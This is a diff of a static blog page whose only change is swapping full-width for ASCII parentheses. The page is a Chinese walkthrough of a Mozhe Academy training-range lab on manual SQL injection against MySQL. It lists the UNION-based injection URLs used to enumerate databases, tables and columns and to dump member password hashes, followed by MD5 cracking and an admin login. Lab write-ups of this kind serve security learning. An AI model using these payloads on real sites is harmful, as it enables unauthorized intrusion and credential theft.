@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    （墨者学院）手工注入漏洞测试(MySQL数据库) |  Tranquillity
+    (墨者学院)手工注入漏洞测试(MySQL数据库) |  Tranquillity
   </title>
   
   <link rel="shortcut icon" href="/feiji.ico" />
@@ -31,7 +31,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-（墨者学院）手工注入漏洞测试-MySQL数据库" class="article article-type-post" itemscope
+  <article id="post-(墨者学院)手工注入漏洞测试-MySQL数据库" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -39,7 +39,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  （墨者学院）手工注入漏洞测试(MySQL数据库)
+  (墨者学院)手工注入漏洞测试(MySQL数据库)
 </h1>
   
 
@@ -48,7 +48,7 @@
 
     
     <div class="article-meta">
-      <a href="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/" class="article-date">
+      <a href="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/" class="article-date">
   <time datetime="2020-01-07T08:43:11.000Z" itemprop="datePublished">2020-01-07</time>
 </a>
       
@@ -71,26 +71,26 @@
 
       
       <ol>
-<li><p>判断是否存在注入点，使用and语句判断注入点类型：<br> /new_list.php?id=1 and 1=1 –+<br> /new_list.php?id=1 and 1=2 –+<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt></p>
+<li><p>判断是否存在注入点，使用and语句判断注入点类型：<br> /new_list.php?id=1 and 1=1 –+<br> /new_list.php?id=1 and 1=2 –+<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" alt></p>
 <a id="more"></a>
 
-<p> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt></p>
+<p> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt></p>
 </li>
 </ol>
 <ol start="2">
-<li>使用order by语句判断存在多少列：<br> /new_list.php?id=1 order by 4 –+  //显示数据<br> /new_list.php?id=1 order by 5 –+  //页面空白<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt></li>
+<li>使用order by语句判断存在多少列：<br> /new_list.php?id=1 order by 4 –+  //显示数据<br> /new_list.php?id=1 order by 5 –+  //页面空白<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt></li>
 </ol>
 <ol start="3">
-<li>由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt></li>
+<li>由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" alt></li>
 </ol>
 <ol start="4">
-<li>由步骤3得知，数据显示的位置为2和3，构造语句查询information_schema库获得库、表、列：<br> /new_list.php?id=0 union select 1,database(),3,4 –+  //获得当前数据库名：mozhe_Discuz_StormGroup<br> /new_list.php?id=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=”mozhe_Discuz_StormGroup” –+  //获得当前数据库的所有表：StormGroup_member,notice<br> /new_list.php?id=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=”mozhe_Discuz_StormGroup” and table_name=”StormGroup_member” –+  //获得StormGroup_member表的所有列：id,name,password,status<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt></li>
+<li>由步骤3得知，数据显示的位置为2和3，构造语句查询information_schema库获得库、表、列：<br> /new_list.php?id=0 union select 1,database(),3,4 –+  //获得当前数据库名：mozhe_Discuz_StormGroup<br> /new_list.php?id=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=”mozhe_Discuz_StormGroup” –+  //获得当前数据库的所有表：StormGroup_member,notice<br> /new_list.php?id=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=”mozhe_Discuz_StormGroup” and table_name=”StormGroup_member” –+  //获得StormGroup_member表的所有列：id,name,password,status<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" alt></li>
 </ol>
 <ol start="5">
-<li>使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开：<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" alt></li>
+<li>使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开：<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" alt></li>
 </ol>
 <ol start="6">
-<li>复制status为1的密码进行MD5解密：<br> <img src="/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" alt></li>
+<li>复制status为1的密码进行MD5解密：<br> <img src="/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" alt></li>
 </ol>
 <ol start="7">
 <li>在首页使用账号密码登录后台，获得KEY，完成。</li>
@@ -101,7 +101,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%EF%BC%88%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%89%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ck53myurk0004s0wre1iqdcmq"
+      <a data-url="http://yoursite.com/2020/(%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2)%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ck53n1ivj0000pgwr4jwre5l3"
         class="article-share-link">Share</a>
       
     </footer>
